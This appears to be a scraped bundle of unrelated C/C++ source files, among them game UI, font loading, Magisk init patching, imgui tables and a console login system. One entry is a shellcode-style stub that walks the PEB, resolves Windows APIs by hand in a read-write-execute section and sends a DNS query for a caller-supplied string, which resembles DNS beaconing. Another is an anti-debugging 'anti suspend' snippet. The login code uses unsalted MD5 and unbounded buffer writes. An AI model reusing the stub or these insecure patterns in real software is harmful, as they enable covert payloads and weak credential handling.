lines\n    for (int at = achievements.size() - 1; at >= 0; at--) {\n        auto &achievement = achievements.at(at);\n        if (achievement.section != ((AchievementScreen *) self)->section) continue;\n        // Don't show hidden until they are completed\n        if (achievement.hidden && !achievement.completed) continue;\n        // Dep lines\n        bool can_be_rendered = true;\n        for (int dep : achievement.deps) {\n            achievement_t &parent = achievements.at(dep);\n            // Don't show children of hidden achievements until they are completed\n            if ((parent.hidden && !parent.completed) || parent.force_hidden) {\n                achievement.force_hidden = true;\n                can_be_rendered = false;\n                continue;\n            }\n            // Stupid edge case\n            if (parent.x == achievement.x && parent.y == achievement.y) {\n                continue;\n            }\n            // See https://www.desmos.com/calculator/n78wzgstfj for a visualization\n            // Get the middle points and angle\n            Vec2 p1 = Vec2(achievement), p2 = Vec2(parent);\n            float a = atan2(p2.y - p1.y, p2.x - p1.x) + M_PI/2;\n            // Get the edge points\n            constexpr float thickness = 2;\n            Vec2 p1_1{thickness * float(cos(a)) + p1.x, thickness * float(sin(a)) + p1.y};\n            Vec2 p1_2 = (p1 - p1_1) + p1;\n            Vec2 p2_1 = (p1 - p1_1) + p2 + offset;\n            Vec2 p2_2 = (p1 - p1_2) + p2 + offset;\n            p1_1 += offset;\n            p1_2 += offset;\n            // Draw\n            Tesselator *t = &Tesselator_instance;\n            glEnable(GL_BLEND);\n            glDisable(GL_TEXTURE_2D);\n            glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);\n            Tesselator_begin(t, 7);\n            // Green line for possible, gray line otherwise\n            if (parent.completed) {\n                Tesselator_colorABGR(t, 0xFF68BB68);\n            } else {\n                Tesselator_colorABGR(t, 0xFF686868);\n            }\n            Tesselator_vertexUV(t, p2_2.x / scale, p2_2.y / scale, 0, 1, 0);\n            Tesselator_vertexUV(t, p2_1.x / scale, p2_1.y / scale, 0, 1, 1);\n            T",
    "#include <iostream>\r\n#include <Windows.h>\r\n#include <thread>\r\n\r\nclass c_globals {\r\npublic:\r\n    HANDLE hThread; // thread handle we create.\r\n    int count = 128; // amount of times we suspend\r\n\r\n    // class to store all our information.\r\n}; static c_globals* globals = new c_globals();\r\n\r\nint main() {\r\n    \r\n    globals->hThread = CreateThread(NULL, 0, 0, NULL, 0, NULL); // dummy thread to base detections from.\r\n\r\n    DebugActiveProcessStop(GetCurrentProcessId()); // self explanatory \r\n\r\n    for (size_t i = 0; i < globals->count; ++i) {\r\n        SuspendThread(globals->hThread); // max out the limit.\r\n    }\r\n\r\n    while (globals->hThread != reinterpret_cast<HANDLE>((DWORD)-1))\r\n    {\r\n        if (SuspendThread(globals->hThread) != (DWORD)-1) {\r\n            std::cout << \"Anti Suspend Activated. \\n\" << std::endl;\r\n            std::cin.get(); // here i chose to just stop everything, in a real case scenario you would send a notifaction or kill the program.\r\n        }\r\n        std::cout << \"we are good. \\n\"; // here you do nothing. || real case scenario this should be threaded.\r\n    }\r\n\r\n    CloseHandle(globals->hThread);\r\n}\r\n",
    "#include \"client/gui/font/loader.hpp\"\n\n#include <iostream>\n\n// freetype needs this extra include for whatever unholy reason\n#include <ft2build.h>\n#include FT_FREETYPE_H  \n\n#include \"shared/utilities/root_path.hpp\"\n\nnamespace gui::font {\n\nbool Loader::init() {\n    if (FT_Init_FreeType(&this->ft)) {\n        std::cerr << \"ERROR::FREETYPE: Could not init FreeType Library\" << std::endl;\n        return false;\n    }\n\n    // we mess with some alignment when creating the textures, \n    // so this is supposed to prevent seg faults related to that\n    glPixelStorei(GL_UNPACK_ALIGNMENT, 1);\n\n    if (!this->_loadFont(Font::MENU)) {\n        return false;\n    }\n    if (!this->_loadFont(Font::TEXT)) {\n        return false;\n    }\n\n    FT_Done_FreeType(this->ft); // done loading fonts, so can release these resources\n\n    return true;\n}\n\nconst Character& Loader::loadChar(char c, Font font) const {\n    auto& char_map = this->font_map.at(font);\n\n    if (!char_map.contains(c)) {\n        return char_map.at('?');\n    }\n\n    return char_map.at(c);\n}\n\nbool Loader::_loadFont(Font font) {\n    auto path = font::getFilepath(font);\n\n    std::cout << \"Loading font: \" << path << \"\\n\";\n\n    FT_Face face;\n    if (FT_New_Face(this->ft, path.c_str(), 0, &face)) {\n        std::cout << \"ERROR::FREETYPE: Failed to load font at \" << path << std::endl;  \n        return false;\n    }\n\n    FT_Set_Pixel_Sizes(face, 0, UNIT_LARGE_SIZE_PX);\n    std::unordered_map<unsigned char, Character> characters;\n    for (unsigned char c = 0; c < 128; c++) {\n        // load character glyph \n        if (FT_Load_Char(face, c, FT_LOAD_RENDER)) {\n            std::cerr << \"ERROR::FREETYTPE: Failed to load Glyph \" << c << std::endl;\n            return false;\n        }\n\n        // generate texture\n        unsigned int texture;\n        glGenTextures(1, &texture);\n        glBindTexture(GL_TEXTURE_2D, texture);\n        glTexImage2D(\n            GL_TEXTURE_2D,\n            0,\n            GL_RED,\n            face->glyph->bitmap.width,\n            face->glyph->bitmap.rows,\n            0,\n            GL_RED,\n            GL_UNSIGNED_BYTE,\n            face->glyph->bitmap.buffer\n        );\n        // set texture options\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n        // now store character for later use\n        Character character = {\n            texture, \n            glm::ivec2(face->glyph->bitmap.width, face->glyph->bitmap.rows),\n            glm::ivec2(face->glyph->bitmap_left, face->glyph->bitmap_top),\n            static_cast<unsigned int>(face->glyph->advance.x)\n        };\n        characters.insert({c, character});\n    }\n\n    this->font_map.insert({font, characters});\n\n    FT_Done_Face(face);\n\n    return true;\n}\n\n}\n",
    "////////////////////////////////////////////////////////////////////////////\n//\n// This file is part of sc4-growify, a DLL Plugin for SimCity 4 that adds\n// a cheat code to convert plopped buildings to a growable RCI zone type.\n//\n// Copyright (c) 2024 Nicholas Hayes\n//\n// This file is licensed under terms of the MIT License.\n// See LICENSE.txt for more information.\n//\n////////////////////////////////////////////////////////////////////////////\n\n#include \"StringViewUtil.h\"\n/* #include \"boost/algorithm/string.hpp\" */\n\n/* bool StringViewUtil::EqualsIgnoreCase(const std::string_view& lhs, const std::string_view& rhs) */\n/* { */\n/* \treturn lhs.length() == rhs.length() */\n/* \t\t&& boost::iequals(lhs, rhs); */\n/* } */\n\n/* bool StringViewUtil::StartsWithIgnoreCase(const std::string_view& lhs, const std::string_view& rhs) */\n/* { */\n/* \treturn lhs.length() >=  rhs.length() */\n/* \t\t&& boost::istarts_with(lhs, rhs); */\n/* } */\n\nvoid StringViewUtil::Split(\n\tconst std::string_view& input,\n\tstd::string_view::value_type delim,\n\tstd::vector<std::string_view>& results)\n{\n\t// The following code is adapted from: https://stackoverflow.com/a/36301144\n\n\tconst size_t inputLength = input.length();\n\tbool foundDoubleQuote = false;\n\tbool foundSingleQuote = false;\n\tsize_t argumentLength = 0;\n\n\tfor (size_t i = 0; i < inputLength; i++)\n\t{\n\t\tsize_t start = i;\n\t\tif (input[i] == '\\\"')\n\t\t{\n\t\t\tfoundDoubleQuote = true;\n\t\t}\n\t\telse if (input[i] == '\\'')\n\t\t{\n\t\t\tfoundSingleQuote = true;\n\t\t}\n\n\t\tif (foundDoubleQuote)\n\t\t{\n\t\t\ti++;\n\t\t\tstart++;\n\n\t\t\twhile (i < inputLength && input[i] != '\\\"')\n\t\t\t{\n\t\t\t\ti++;\n\t\t\t}\n\n\t\t\tif (i < inputLength)\n\t\t\t{\n\t\t\t\tfoundDoubleQuote = false;\n\t\t\t}\n\n\t\t\targumentLength = i - start;\n\t\t\ti++;\n\t\t}\n\t\telse if (foundSingleQuote)\n\t\t{\n\t\t\ti++;\n\t\t\tstart++;\n\n\t\t\twhile (i < inputLength && input[i] != '\\'')\n\t\t\t{\n\t\t\t\ti++;\n\t\t\t}\n\n\t\t\tif (i < inputLength)\n\t\t\t{\n\t\t\t\tfoundSingleQuote = false;\n\t\t\t}\n\n\t\t\targumentLength = i - start;\n\t\t\ti++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (i < inputLength && input[i] != delim)\n\t\t\t{\n\t\t\t\ti++;\n\t\t\t}\n\t\t\targumentLength = i - start;\n\t\t}\n\n\t\tif (argumentLength > 0)\n\t\t{\n\t\t\tresults.push_back(input.substr(start, argumentLength));\n\t\t}\n\t}\n}\n\n/* std::string_view StringViewUtil::TrimWhiteSpace(const std::string_view& input) */\n/* { */\n/* \treturn boost::trim_copy(input); */\n/* } */\n",
    "/*!\n * Copyright (c) Alibaba, Inc. and its affiliates.\n * @file    allspark_service_parallel.cpp\n */\n#include \"allspark_service_parallel.h\"\n\n#include <glog/logging.h>\n#include <omp.h>\n\n#include <mutex>\n\nnamespace allspark {\nnamespace allspark_service {\n\nclass ThreadException {\n public:\n  ThreadException() : ptr_(nullptr) {}\n  ~ThreadException() = default;\n  void ConditionRethrow() {\n    if (ptr_) std::rethrow_exception(ptr_);\n  }\n  void CaptureException() {\n    std::unique_lock<std::mutex> guard(lock_);\n    ptr_ = std::current_exception();\n  }\n  template <typename Function, typename... Parameters>\n  void Run(Function f, Parameters... params) {\n    try {\n      f(params...);\n    } catch (...) {\n      CaptureException();\n    }\n  }\n\n private:\n  std::exception_ptr ptr_;\n  std::mutex lock_;\n};\n\nvoid parallel_loop(const int begin, const int end,\n                   const ParallelForBody& body) {\n  ThreadException e;\n#pragma omp parallel for num_threads(8)\n  for (int i = begin; i < end; i++) {\n    e.Run([=] { body(i); });\n  }\n  e.ConditionRethrow();\n}\n}  // namespace allspark_service\n}  // namespace allspark\n",
    "#include <sys/mount.h>\n\n#include <consts.hpp>\n#include <base.hpp>\n#include <sys/vfs.h>\n\n#include \"init.hpp\"\n\nusing namespace std;\n\nvoid FirstStageInit::prepare() {\n    prepare_data();\n\n    if (struct stat st{}; fstatat(-1, \"/sdcard\", &st, AT_SYMLINK_NOFOLLOW) != 0 &&\n        fstatat(-1, \"/first_stage_ramdisk/sdcard\", &st, AT_SYMLINK_NOFOLLOW) != 0) {\n        if (config->force_normal_boot) {\n            xmkdirs(\"/first_stage_ramdisk/storage/self\", 0755);\n            xsymlink(\"/system/system/bin/init\", \"/first_stage_ramdisk/storage/self/primary\");\n            LOGD(\"Symlink /first_stage_ramdisk/storage/self/primary -> /system/system/bin/init\\n\");\n            close(xopen(\"/first_stage_ramdisk/sdcard\", O_RDONLY | O_CREAT | O_CLOEXEC, 0));\n        } else {\n            xmkdirs(\"/storage/self\", 0755);\n            xsymlink(\"/system/system/bin/init\", \"/storage/self/primary\");\n            LOGD(\"Symlink /storage/self/primary -> /system/system/bin/init\\n\");\n        }\n        xrename(\"/init\", \"/sdcard\");\n        // Try to keep magiskinit in rootfs for samsung RKP\n        if (mount(\"/sdcard\", \"/sdcard\", nullptr, MS_BIND, nullptr) == 0) {\n            LOGD(\"Bind mount /sdcard -> /sdcard\\n\");\n        } else {\n            // rootfs before 3.12\n            xmount(\"/data/magiskinit\", \"/sdcard\", nullptr, MS_BIND, nullptr);\n            LOGD(\"Bind mount /sdcard -> /data/magiskinit\\n\");\n        }\n        restore_ramdisk_init();\n    } else {\n        restore_ramdisk_init();\n        // fallback to hexpatch if /sdcard exists\n        auto init = mmap_data(\"/init\", true);\n        // Redirect original init to magiskinit\n        for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) {\n            LOGD(\"Patch @ %08zX [\" INIT_PATH \"] -> [\" REDIR_PATH \"]\\n\", off);\n        }\n    }\n}\n\nvoid LegacySARInit::first_stage_prep() {\n    // Patch init binary\n    int src = xopen(\"/init\", O_RDONLY);\n    int dest = xopen(\"/data/init\", O_CREAT | O_WRONLY, 0);\n    {\n        mmap_data init(\"/init\");\n        for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) {\n            LOGD(\"Patch @ %08zX [\" INIT_PATH \"] -> [\" REDIR_PATH \"]\\n\", off);\n        }\n        write(dest, init.buf(), init.sz());\n        fclone_attr(src, dest);\n        close(dest);\n        close(src);\n    }\n    xmount(\"/data/init\", \"/init\", nullptr, MS_BIND, nullptr);\n}\n\nbool SecondStageInit::prepare() {\n    umount2(\"/init\", MNT_DETACH);\n    umount2(INIT_PATH, MNT_DETACH); // just in case\n    unlink(\"/data/init\");\n\n    // Make sure init dmesg logs won't get messed up\n    argv[0] = (char *) INIT_PATH;\n\n    // Some weird devices like meizu, uses 2SI but still have legacy rootfs\n    struct statfs sfs{};\n    statfs(\"/\", &sfs);\n    if (sfs.f_type == RAMFS_MAGIC || sfs.f_type == TMPFS_MAGIC) {\n        // We are still on rootfs, so make sure we will execute the init of the 2nd stage\n        unlink(\"/init\");\n        xsymlink(INIT_PATH, \"/init\");\n        return true;\n    }\n    return false;\n}\n",
    "// dear imgui, v1.89.2\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.\n//  ",
    "#include \"BST.h\"\n\n#include <iostream>\n#include <sstream>\n\ntemplate <typename T>\nBST<T>::BST()\n{\n    root = nullptr;\n}\n\ntemplate <typename T>\nvoid BST<T>::insert(T val)\n{\n    insert(root, val);\n}\n\ntemplate <typename T>\nvoid BST<T>::insert(Node<T>*& node, T val)\n{\n    if(node == nullptr)\n    {\n        node = new Node<T> { val, nullptr, nullptr };\n        return;\n    }\n\n    if(val < node->value)\n    {\n        insert(node->left, val);\n        return;\n    }\n\n    if(val > node->value)\n    {\n        insert(node->right, val);\n    }\n}\n\ntemplate <typename T>\nvoid BST<T>::traverse()\n{\n    std::string str = traverse(root);\n    std::cout << str << std::endl;\n}\n\ntemplate <typename T>\nstd::string BST<T>::traverse(Node<T>* node)\n{\n    if(node == nullptr)\n        return \"\";\n\n    std::ostringstream os;\n    os << traverse(node->left) << node->value << \" \" << traverse(node->right);\n    return os.str();\n}\n\ntemplate <typename T>\nBST<T>::~BST()\n{\n    if(root == nullptr)\n        return;\n    Node<T>* n = root;\n    DeleteBranch(n->left);\n    DeleteBranch(n->right);\n    delete n;\n}\n\ntemplate <typename T>\nvoid BST<T>::DeleteBranch(Node<T>* node)\n{\n    if(node == nullptr)\n        return;\n    \n    if(node->left != nullptr)\n        DeleteBranch(node->left);\n    if(node->right != nullptr)\n        DeleteBranch(node->right);\n\n    delete node;\n}\n",
    "\ufeff\n#include <windows.h>\n#include <stdio.h>\n\n#include \"decl_func.h\"\n\n#pragma comment(linker,\"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.pdata=.text\")\n#pragma section(\".text\",read,write,execute)\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR Buffer;\n} UNICODE_STRING;\n\nstruct LDR_MODULE {\n    LIST_ENTRY e[3];\n    HMODULE base;\n    void* entry;\n    UINT size;\n    UNICODE_STRING dllPath;\n    UNICODE_STRING dllname;\n};\n\nstatic char* _CharLowerA(char* str)\n{\n    int i = 0;\n    while (str[i])\n    {\n        if ((str[i] >= 'A') && (str[i] <= 'Z'))\n        {\n            str[i] = str[i] + 0x20;\n        }\n        i++;\n    }\n\n    return str;\n}\n\nstatic char* unicode_name_transform_to_char(LDR_MODULE* mdll, char* name) {\n    // TODO 64 is bad \n    for (size_t i = 0; (i < mdll->dllname.Length) && (i < 64); i++)\n    {\n        name[i] = (char)mdll->dllname.Buffer[i];\n    }\n    return _CharLowerA(name);\n}\n\nint cmpstr(const char* s1, const char* s2)\n{\n    while (*s1 && *s1 == *s2) ++s1, ++s2;\n    return ((unsigned char)*s1 > (unsigned char)*s2) -\n        ((unsigned char)*s1 < (unsigned char)*s2);\n}\n\nvoid cpystr(char* to, char* from)\n{\n    while (*from)\n    {\n        *to = *from;\n        to++;\n        from++;\n    }\n    *to = *from;\n}\n\nstatic HMODULE getKernel32_by_str() {\n    HMODULE kernel32;\n    INT_PTR peb = __readgsqword(0x60);\n    auto modList = 0x18;\n    auto modListFlink = 0x18;\n    auto kernelBaseAddr = 0x10;\n\n    auto mdllist = *(INT_PTR*)(peb + modList);\n    auto mlink = *(INT_PTR*)(mdllist + modListFlink);\n    auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);\n    auto mdl = (LDR_MODULE*)mlink;\n    do {\n        mdl = (LDR_MODULE*)mdl->e[0].Flink;\n        if (mdl->base != nullptr) {\n            char name[64];\n            if (!cmpstr(\"kernel32.dll\", unicode_name_transform_to_char(mdl, name))) {\n                break;\n            }\n        }\n    } while (mlink != (INT_PTR)mdl);\n\n    kernel32 = (HMODULE)mdl->base;\n    return kernel32;\n}\n\nstatic LPVOID getAPIAddr_byStr(HMODULE module_address, char* name)\n{\n    PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)module_address;\n    PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)module_address + img_dos_header->e_lfanew);\n    PIMAGE_EXPORT_DIRECTORY img_export_directory = (PIMAGE_EXPORT_DIRECTORY)(\n    (LPBYTE)module_address + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n    PDWORD fAddr = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfFunctions);\n    PDWORD fNames = (PDWORD)((LPBYTE)module_address + img_export_directory->AddressOfNames);\n    PWORD  fOrd = (PWORD)((LPBYTE)module_address + img_export_directory->AddressOfNameOrdinals);\n\n    for (DWORD i = 0; i < img_export_directory->AddressOfFunctions; i++) {\n        LPSTR pFuncName = (LPSTR)((LPBYTE)module_address + fNames[i]);\n\n        char tmpFuncName[MAX_PATH];\n        cpystr(tmpFuncName, pFuncName);\n        _CharLowerA(tmpFuncName);\n\n        if (!cmpstr(name, tmpFuncName))\n        {\n            return (LPVOID)((LPBYTE)module_address + fAddr[fOrd[i]]);\n        }\n\n    }\n    return nullptr;\n}\n\n#pragma comment(lib, \"dnsapi.lib\")\n\nint main(wchar_t *dns_str) {\n\n    HMODULE mod_kernel32 = getKernel32_by_str();\n    fnGetProcAddress myGetProcAddress = (fnGetProcAddress)getAPIAddr_byStr(mod_kernel32, \"getprocaddress\");\n\n    fnLoadLibraryA myLoadLibrary = (fnLoadLibraryA)myGetProcAddress(mod_kernel32, \"LoadLibraryA\");\n\n    HMODULE dnsLib = myLoadLibrary(\"DNSAPI.dll\");\n    fnDnsQuery_W myDnsQuery_W = (fnDnsQuery_W)myGetProcAddress(dnsLib, \"DnsQuery_W\");\n\n    PDNS_RECORD dnsRecord;\n\n    myDnsQuery_W(\n        dns_str,\n        DNS_TYPE_A,\n        DNS_QUERY_STANDARD,\n        NULL,\n        &dnsRecord,\n        NULL\n    );\n\n    return 0;\n}",
    "#include \"object.h\"\n\nnamespace obj {\n\nobject::object() {\n    this->name = \"\";\n    this->type = \"\";\n    this->valid_space = 0;\n}\n\nobject::object(std::string name, std::string type, int valid_space) {\n    this->name = name;\n    this->type = type;\n    this->valid_space = valid_space;\n}\n\nobject::object(const object& other) : name(other.name), type(other.type), valid_space(other.valid_space) {}\n\nvalue_object::value_object(std::string name, std::string type, int valid_space) {\n    this->name = name;\n    this->type = type;\n    this->valid_space = valid_space;\n    reg_pos = nullptr;\n}\n\nvalue_object::value_object() {\n    this->name = \"\";\n    this->type = \"value\";\n    this->valid_space = 0;\n    reg_pos = nullptr;\n}\n\nvalue_object::value_object(const value_object& other) : object(other.name, other.type, other.valid_space), stk_pos(other.stk_pos), reg_pos(nullptr) {\n    if (other.reg_pos != nullptr) {\n    reg_pos = memory::alloc_reg(this);\n    reg_pos->nowUsing = this;\n    reg_pos->get_pos() = other.reg_pos->get_pos();\n    }\n}\n\nnative::Str16 value_object::load_reg() {\n    if (reg_pos == nullptr) {\n        reg_pos = memory::alloc_reg(this);\n        assert(reg_pos != nullptr);\n        store2reg();\n    }\n    debug(\"fuck5555\");\n    \n    return reg_pos->get_pos();\n}\n\nnative::Str16 value_object::load_reg(int x) {\n    if (reg_pos == nullptr) {\n        reg_pos = memory::alloc_reg(this, x);\n        assert(reg_pos != nullptr);\n        store2reg();\n    }\n    \n    return reg_pos->get_pos();\n}\n\nvoid value_object::store2reg() {\n    debug(\"fuck!\");\n}\n\nvoid value_object::free_reg() {\n    assert(reg_pos);\n    if (reg_pos) {\n        memory::free_reg(reg_pos);\n        reg_pos = nullptr;\n    }\n}\n\nvoid value_object::save_reg(native::Str16 stk) {\n    assert(reg_pos);\n    mips::binary_access(\"sw\", reg_pos -> get_pos(), stk, __PRETTY_FUNCTION__);\n    free_reg();\n}\n\nnative::Str16 value_object::load_stk() {\n    debug(\"fuck111\");\n    auto temp = stk_pos.get_pos(4);\n    debug(temp);\n    return temp;\n}\n\n\n\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"users.h\"\r\n#include \"md5.h\"\r\n\r\nusing namespace std;\r\nint f1 = 0; //0\u767b\u9646\u672a\u6210\u529f\uff0c1\u666e\u901a\u7528\u6237\uff0c2\u4e3aAdmin\u8d26\u6237\r\n\r\nstruct user {\r\n    char name[50];\r\n    char password[100];\r\n};\r\n\r\nstring name; //\u7528\u6237\u540d\u53d8\u91cf\uff0c\u8bbe\u7f6e\u4e3a\u5168\u5c40\u53d8\u91cf\r\n\r\nvoid homepage();\r\nvoid login();\r\nvoid regist();\r\n\r\n\r\n//\u9996\u9875\r\nvoid homepage() {\r\n    int input;\r\n    cout << \"==========================================\" << endl;\r\n    cout << \"|Welcome to the order system by MiguoQAQ!|\" << endl;\r\n    cout << \"| log in:   press \\\"1\\\"                    |\" << endl;\r\n    cout << \"| register: press \\\"2\\\"                    |\" << endl;\r\n    cout << \"==========================================\\n>>\";\r\n    // Get the user input\r\n    input = getch();\r\n    cout << char(input) << endl;\r\n\r\n    if (input == '1') {\r\n        login();\r\n    } else if (input == '2') {\r\n        regist();\r\n    } else {\r\n        cout << \"bad input :(\\n\";\r\n        homepage();\r\n    }\r\n    return;\r\n}\r\n\r\n\r\n//\u767b\u9646\r\nvoid login() {\r\n    char *password = new char[100];\r\n    cout << \"username:\\n>>\";\r\n    cin >> name;\r\n    cout << \"password:\\n>>\";\r\n    char test;\r\n    int  i = 0;\r\n    while ((test = getch()) != '\\r') //\u5b9e\u73b0\u8f93\u5165\u5bc6\u7801\u663e\u793a*\uff0c\u540c\u65f6\u9000\u56de\u4e5f\u4f1a\u51cf\u53bb*\r\n    {\r\n        if (test == 8) {\r\n            if (i > 0) {\r\n                cout << test << \" \" << test;\r\n                password[i--] = '\\0';\r\n            }\r\n        } else {\r\n            if (i < 20)\r\n                cout << \"*\";\r\n            password[i] = test;\r\n            i++;\r\n        }\r\n    }\r\n    password[i] = '\\0';\r\n    ifstream fin(\"user.dat\", ios::binary);\r\n    if (!fin) {\r\n        cout << \"Error opening file\\n\";\r\n        return;\r\n    }\r\n\r\n    user   c;\r\n    string passwordmd5 = md5(password);\r\n    char  *st1         = const_cast<char *>(passwordmd5.c_str());\r\n    while (fin >> c.name >> c.password) {\r\n        if (strcmp(c.name, \"Admin\") == 0 && strcmp(c.password, st1) == 0) {\r\n            f1 = 2; //\u8bbe\u7f6eflag\u4e3a\u7ba1\u7406\u5458\u7528\u6237\r\n            return;\r\n        } else if (strcmp(c.name, name.c_str()) == 0 && strcmp(c.password, st1) == 0) {\r\n            system(\"cls\");\r\n            cout << \"\\n==========================================\\n\";\r\n            cout << \"Welcome,\" << name.c_str() << \"!\" << endl;\r\n            f1 = 1; //\u8bbe\u7f6eflag\u4e3a\u666e\u901a\u7528\u6237\r\n            return;\r\n        }\r\n    }\r\n    if (f1 == 0) {\r\n        cout << \"\\nWrong username or password\\n\";\r\n        login();\r\n    }\r\n}\r\n\r\n\r\n//\u6ce8\u518c\u51fd\u6570\r\nvoid regist() {\r\n    char    *password = new char[100]; //\u5206\u914d20\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u8fd4\u56de\u9996\u5730\u5740\u7ed9password,\u5373password\u53ef\u4ee5\u770b\u505a\u4e00\u4e2a20\u5b57\u8282\u7684\u5b57\u7b26\u6570\u7ec4\uff0c\u5373\u5b57\u7b26\u4e32\r\n    user     c;\r\n    ifstream fin; //\u58f0\u660e ifstream \u5bf9\u8c61\r\n    fin.open(\"user.dat\", ios::binary | ios::in); //\u7528\u6237\u6587\u4ef6\r\n    cout << \"please input your username:\";\r\n    cin >> name;\r\n    while (fin >> c.name >> c.password) {\r\n        if (c.name 